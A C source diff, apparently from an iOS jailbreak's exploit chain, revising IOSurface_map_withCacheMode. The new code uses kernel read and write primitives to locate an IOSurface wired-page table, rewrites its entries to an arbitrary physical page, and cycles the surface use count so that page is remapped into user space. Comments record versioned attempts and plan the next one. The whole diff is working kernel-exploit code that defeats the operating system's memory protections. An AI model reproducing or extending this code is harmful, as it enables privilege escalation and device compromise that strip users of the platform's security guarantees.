@@ -324,33 +324,75 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 				             (unsigned long long)kread64(a70 + 8 * qi));
 		}
 		if (a90) {
-			int n90 = (seq == 0) ? 16 : 3;
-			for (int qi = 0; qi < n90; qi++)
-				jb_tr_beacon("KMAP d90,q%d=%llx", qi,
-				             (unsigned long long)kread64(a90 + 8 * qi));
-			// deref the moving q2 (per-surface pointer) one level deeper —
-			// full 8-qword dump on window 0 (it changes per surface, but the
-			// STRUCTURE is what we need; windows 1+ skip the deep walk)
+			// v101: the WIRED-PAGE TABLE is d90.q2 (v100: records of
+			// (PAC,1,tablePtr,0x30), table entries = (pagenum<<12)|flags,
+			// header q5=0xc040_00001000, live entries from q6).
+			// REWRITE, timed AFTER drain-to-0 / BEFORE increment (an
+			// unwire may rebuild the table from the descriptor — the
+			// rewrite must be the last thing the re-wire sees).
 			uint64_t q2 = kread64(a90 + 16);
 			uint64_t aq2 = q2 ? phystokv(kvtophys(q2)) : 0;
 			jb_tr_beacon("KMAP d90,q2=%llx,al=%llx",
 			             (unsigned long long)q2, (unsigned long long)aq2);
 			if (aq2 && seq == 0) {
-				for (int qi = 0; qi < 8; qi++)
+				for (int qi = 0; qi < 16; qi++)
 					jb_tr_beacon("KMAP d90q2,q%d=%llx", qi,
 					             (unsigned long long)kread64(aq2 + 8 * qi));
 			}
-		}
+			if (!aq2) {
+				jb_tr_beacon("KMAP fail,noq2alias");
+				*uaddr = NULL;
+				return -1;
+			}
 
-		// Re-wire: drain to 0 (unwire) → increment (re-wire reading the
-		// REWRITTEN packed list).
-		uint32_t uc = IOSurfaceGetUseCount(ref0);
-		while (uc > 0) {
-			IOSurfaceDecrementUseCount(ref0);
-			uc = IOSurfaceGetUseCount(ref0);
+			// Drain to 0 FIRST (unwire — the re-wire will rebuild, and our
+			// rewrite lands after the drain so it survives as the input).
+			uint32_t uc = IOSurfaceGetUseCount(ref0);
+			while (uc > 0) {
+				IOSurfaceDecrementUseCount(ref0);
+				uc = IOSurfaceGetUseCount(ref0);
+			}
+
+			// Snapshot the table POST-DRAIN (it may have been rebuilt),
+			// then rewrite every non-zero entry's pagenum to the window
+			// BASE page, preserving each entry's own flags. (v100 showed
+			// q6==q7 — slot↔page correspondence unproven; v101 maps ALL
+			// entries to the base page = single-page verification. The
+			// probe's first read still discriminates: hole content vs 0,0.)
+			uint64_t snap[16];
+			int nEntries = 0, nRewritten = 0;
+			uint64_t pagenum = (pa & ~0x3FFFULL) >> 12;
+			for (int qi = 6; qi < 16; qi++) {
+				snap[qi] = kread64(aq2 + 8 * qi);
+				if (seq == 0)
+					jb_tr_beacon("KMAP wt,pre,q%d=%llx", qi,
+					             (unsigned long long)snap[qi]);
+				if (snap[qi] == 0) continue;
+				nEntries++;
+				uint64_t newEnt = (snap[qi] & 0xFFFULL) | (pagenum << 12);
+				kwrite64(aq2 + 8 * qi, newEnt);
+				nRewritten++;
+				if (seq == 0)
+					jb_tr_beacon("KMAP wt,rew,q%d: %llx->%llx", qi,
+					             (unsigned long long)snap[qi],
+					             (unsigned long long)newEnt);
+			}
+			jb_tr_beacon("KMAP wt,done,entries=%d,rewritten=%d",
+			             nEntries, nRewritten);
+			if (nRewritten == 0) {
+				jb_tr_beacon("KMAP fail,wt,noentries");
+				*uaddr = NULL;
+				return -1;
+			}
+
+			// Re-wire: the increment reads our rewritten table.
+			IOSurfaceIncrementUseCount(ref0);
+			jb_tr_beacon("KMAP uc,cycled=1");
+		} else {
+			jb_tr_beacon("KMAP fail,nod90");
+			*uaddr = NULL;
+			return -1;
 		}
-		IOSurfaceIncrementUseCount(ref0);
-		jb_tr_beacon("KMAP uc,cycled=1");
 	}
 
 	// Send-right kobject field dump (client-walk fallback feed).
@@ -380,10 +422,11 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		*uaddr = NULL;
 		return -1;
 	}
-	// v98 discriminator: TARGET WINDOW CONTENT ⇒ the packed-list rewrite
-	// re-aimed the backing ⇒ base1 IS the probe window ⇒ CHAIN GATE.
-	// 0,0 ⇒ re-wire rebuilt the list from the desc (rewrite raced or
-	// ignored) ⇒ v99 readback-timing fix. A5 pattern ⇒ stale mapping.
+	// v101 discriminator: TARGET WINDOW CONTENT (carve-out bytes) ⇒ the
+	// wired-table rewrite re-aimed the backing ⇒ base1 IS the probe window
+	// ⇒ CHAIN GATE. 0,0 ⇒ the re-wire rebuilds the table from the desc
+	// AFTER our rewrite (ordering fight) ⇒ v102 rewrites the DESC-side
+	// source instead. Unmapped-fault pattern ⇒ entry format mismatch.
 	jb_tr_beacon("KMAP C,first=%llx,%llx",
 	             (unsigned long long)*(volatile uint64_t *)base1,
 	             (unsigned long long)((volatile uint64_t *)base1)[1]);
